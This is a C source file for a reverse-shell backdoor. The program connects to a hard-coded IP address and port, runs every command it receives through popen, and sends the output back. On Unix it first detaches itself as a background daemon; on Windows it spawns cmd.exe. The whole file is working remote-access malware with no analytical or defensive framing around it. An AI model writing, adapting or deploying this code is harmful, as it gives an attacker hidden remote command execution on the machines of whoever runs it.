#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>

#ifdef _WIN32
#include <winsock2.h>
#include <windows.h>
#else
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#endif

#define PORT			45577
#define SERVER_IP		"192.168.253.128"
#define BUFFER_SIZE		1024
#define RESPONSE_SIZE	4096

int backdoor(void) {

	int sockfd;
	struct sockaddr_in server_addr;
	char buffer[BUFFER_SIZE];
	char response[RESPONSE_SIZE];
	FILE *fp;
	size_t bytes_received;

	sockfd = socket(AF_INET, SOCK_STREAM, 0);
	if (sockfd < 0) return 1;
	server_addr.sin_family = AF_INET;
	server_addr.sin_port = htons(PORT);
	server_addr.sin_addr.s_addr = inet_addr(SERVER_IP);

	if (connect(sockfd, (struct sockaddr*) &server_addr, sizeof(server_addr)) < 0) {
		return 1;
	}

	while(1) {
		char prompt[] = "[*]-[iLovePenguins]~>  ";
		send(sockfd, prompt, strlen(prompt), 0);
		memset(buffer, 0, BUFFER_SIZE);
		bytes_received = recv(sockfd, buffer, BUFFER_SIZE, 0);
		if (bytes_received <= 0) break;

		buffer[bytes_received] = '\0';
		fp = popen(buffer, "r");
		if (fp == NULL) continue;
		while(fgets(response, sizeof(response)-1, fp) != NULL) send(sockfd, response, strlen(response), 0);
		pclose(fp);
	}
	close(sockfd);
	return 0;
}

int run_backdoor(void) {
	pid_t pid;
	#ifdef _WIN32
		STARTUPINFO si;
		PROCESS_INFORMATION pi;
		ZeroMemory(&si, sizeof(si));
		si.cb = sizeof(si);
		ZeroMemory(&pi, sizeof(pi));
		if(!CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {
			return 1;
		}
		backdoor();
		CloseHandle(pi.hThread);
		CloseHandle(pi.hProcess);
	#else
		pid = fork();
		if(pid < 0 || pid > 0) return 1;
		pid = setsid();
		if(pid < 0) return 1;
		close(STDIN_FILENO);
		close(STDOUT_FILENO);
		close(STDERR_FILENO);
		backdoor();
	#endif
	return 0;
}

int main(void) {
	run_backdoor();
	return 0;
}
